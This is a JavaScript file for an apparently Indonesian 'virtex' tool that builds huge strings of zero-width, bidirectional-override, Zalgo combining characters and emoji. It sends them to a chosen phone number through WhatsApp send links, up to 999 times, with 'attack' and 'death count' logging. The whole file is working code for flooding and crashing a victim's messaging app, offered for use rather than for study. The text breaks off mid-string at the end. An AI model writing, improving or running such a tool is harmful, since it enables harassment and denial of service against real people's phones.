// DATABASE VIRTEX - DEADLY EDITION
const virtexDatabase = {
    1: "‮⁠‍‪⁡‭‏‎﻿" + "̷̸̡̢̧̨̛̖̗̘̙".repeat(500) + "Z̷̡̢̧̨̛̖̗̘̙͓͔͕͖͙͚".repeat(200),
    
    2: "⁠⁡⁢⁣⁤".repeat(1000) + "‮⁠‍‪⁡‭".repeat(500) + "‏‎﻿".repeat(300),
    
    3: "😈👿💀👻👽🤖🎃".repeat(500) + "🔪💣🔥⚡💫💥".repeat(500) + "💔❌⚠️☠️⚰️".repeat(500),
    
    4: "﷽".repeat(1000) + "𒐫𒐪𒐩𒐨𒐧".repeat(500) + "𐌰𐌱𐌲𐌳𐌴".repeat(500),
    
    5: "‮⁠‍‪⁡‭".repeat(2000) + "̷̸̡̢̧̨".repeat(2000) + "Z̷̡̢̺͆".repeat(1000)
};

// Global variables
let attackInterval;
let attackCount = 0;
let deathCount = 0;
let isAttacking = false;

// Load death count from localStorage
if (localStorage.getItem('deathCount')) {
    deathCount = parseInt(localStorage.getItem('deathCount'));
    document.getElementById('deathCount').textContent = deathCount;
}

// Main attack function
function kirimVirtex() {
    if (isAttacking) {
        addLog('⚠️ ATTACK ALREADY IN PROGRESS!', 'warning');
        return;
    }
    
    const target = document.getElementById('targetNumber').value.trim();
    const type = document.getElementById('virtexType').value;
    const jumlah = parseInt(document.getElementById('jumlah').value);
    const delay = parseFloat(document.getElementById('delay').value) * 1000;
    
    // Validation
    if (!target || target.length < 10) {
        addLog('💀 ERROR: Invalid target number!', 'error');
        return;
    }
    
    if (jumlah < 1 || jumlah > 999) {
        addLog('💀 ERROR: Attack count must be 1-999!', 'error');
        return;
    }
    
    // Activate attack mode
    isAttacking = true;
    attackCount = 0;
    
    // Update UI
    document.getElementById('sendBtn').disabled = true;
    document.getElementById('sendBtn').classList.add('attacking');
    document.getElementById('emergencyStop').disabled = false;
    document.getElementById('statusText').textContent = '🔴 ATTACK IN PROGRESS';
    document.getElementById('statusText').style.color = '#ff0000';
    
    // Get virtex
    const virtex = virtexDatabase[type];
    const namaTipe = document.getElementById('virtexType').options[document.getElementById('virtexType').selectedIndex].text;
    
    // Log start
    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
    addLog(`💀 NUCLEAR ATTACK INITIATED`, 'info');
    addLog(`🎯 TARGET: ${target}`, 'info');
    addLog(`⚔️ WEAPON: ${namaTipe}`, 'info');
    addLog(`🔁 ATTACKS: ${jumlah}x`, 'info');
    addLog(`⏱️ DELAY: ${delay/1000}s`, 'info');
    addLog('☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️', 'separator');
    
    // Start attack
    function sendAttack() {
        if (attackCount < jumlah && isAttacking) {
            attackCount++;
            deathCount++;
            
            // Encode and send
            const encodedVirtex = encodeURIComponent(virtex + generateChaos());
            const waURL = `https://api.whatsapp.com/send?phone=${target}&text=${encodedVirtex}`;
            window.open(waURL, '_blank');
            
            // Log success
            addLog(`💥 [${attackCount}/${jumlah}] ATTACK LAUNCHED`, 'success');
            
            // Update death counter
            document.getElementById('deathCount').textContent = deathCount;
            localStorage.setItem('deathCount', deathCount);
            
            // Screen shake effect
            screenShake();
            
            if (attackCount < jumlah && isAttacking) {
                setTimeout(sendAttack, delay);
            } else {
                finishAttack();
            }
        }
    }
    
    setTimeout(sendAttack, 1000);
}

// Emergency stop
function emergencyStop() {
    if (isAttacking) {
        isAttacking = false;
        addLog('⚠️⚠️⚠️ EMERGENCY ABORT ⚠️⚠️⚠️', 'warning');
        addLog('🛑 ATTACK HALTED BY USER', 'warning');
        finishAttack();
    }
}

// Finish attack
function finishAttack() {
    isAttacking = false;
    attackCount = 0;
    
    document.getElementById('sendBtn').disabled = false;
    document.getElementById('sendBtn').classList.remove('attacking');
    document.getElementById('emergencyStop').disabled = true;
    document.getElementById('statusText').textContent = '🔴 ARMED AND DANGEROUS';
    
    addLog('☠️☠️☠️ ATTACK COMPLETED ☠️☠️☠️', 'complete');
    addLog(`💀 TOTAL DEATH COUNT: ${deathCount}`, 'info');
}

// Generate chaos characters
function generateChaos() {
    const chars = ['̷','̸','̡','̢','̧','̨','̛','̖','̗','̘','̙','͓','͔','͕','͖','͙','͚'];
    let result = '';
    for (let i = 0; i < 100; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

// Screen shake effect
function screenShake() {
    document.body.style.animation = 'none';
    document.body.offsetHeight;
    document.body.style.animation = 'bodyPulse 4s infinite';
    
    const intensity = Math.random() * 10 + 5;
    document.querySelector('.container').style.transform = 
        `translate(${Math.random()*intensity-intensity/2}px, ${Math.random()*intensity-intensity/2}px)`;
    
    setTimeout(() => {
        document.querySelector('.container').style.transform = 'translate(0, 0)';
    }, 200);
}

// Add log function
function addLog(message, type) {
    const logContainer = document.getElementById('logContainer');
    const logEntry = document.createElement('p');
    
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    
    switch(type) {
        case 'error':
            logEntry.style.color = '#ff0000';
            logEntry.innerHTML = `[${timestamp}] 💀 ${message}`;
            break;
        case 'success':
            logEntry.style.color = '#ff6666';
            logEntry.innerHTML = `[${timestamp}] 🔥 ${message}`;
            break;
        case 'info':
            logEntry.style.color = '#ffaa00';
            logEntry.innerHTML = `[${timestamp}] ⚡ ${message}`;
            break;
        case 'warning':
            logEntry.style.color = '#ffff00';
            logEntry.innerHTML = `[${timestamp}] ⚠️ ${message}`;
            break;
        case 'separator':
            logEntry.style.color = '#660000';
            logEntry.style.textAlign = 'center';
            logEntry.innerHTML = message;
            break;
        case 'complete':
            logEntry.style.color = '#ff00ff';
            logEntry.style.fontWeight = 'bold';
            logEntry.style.fontSize = '1.1em';
            logEntry.innerHTML = `[${timestamp}] ☠️ ${message}`;
            break;
        default:
            logEntry.style.color = '#ff6666';
            logEntry.innerHTML = `[${timestamp}] ${message}`;
    }
    
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
    
    // Auto delete old logs
    if (logContainer.children.length > 50) {
        logContainer.removeChild(logContainer.children[0]);
    }
}

// Clear log
function clearLog() {
    const logContainer = document.getElementById('logContainer');
    logContainer.innerHTML = '<p class="log-initial">☠️ System armed. Ready to kill. ☠️</p>';
    addLog('🗑️ BATTLE LOG CLEARED', 'warning');
}

// Export log
function exportLog() {
    const logContainer = document.getElementById('logContainer');
    let logText = 'OXYX VIRTEX - BATTLE LOG\n';
    logText += '========================\n\n';
    
    Array.from(logContainer.children).forEach(child => {
        logText += child.innerText + '\n';
    });
    
    const blob = new Blob([logText], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `battle-log-${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
    a.click();
    
    addLog('📤 BATTLE LOG EXPORTED', 'info');
}

// Number control buttons
document.querySelectorAll('.num-up').forEach(btn => {
    btn.addEventListener('click', function() {
        const input = this.closest('.number-wrapper').querySelector('input');
        input.stepUp();
        input.dispatchEvent(new Event('change'));
    });
});

document.querySelectorAll('.num-down').forEach(btn => {
    btn.addEventListener('click', function() {
        const input = this.closest('.number-wrapper').querySelector('input');
        input.stepDown();
        input.dispatchEvent(new Event('change'));
    });
});

// Enter key
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && !isAttacking) {
        kirimVirtex();
    }
});

// Random death messages
const deathMessages = [
    "Another one bites the dust
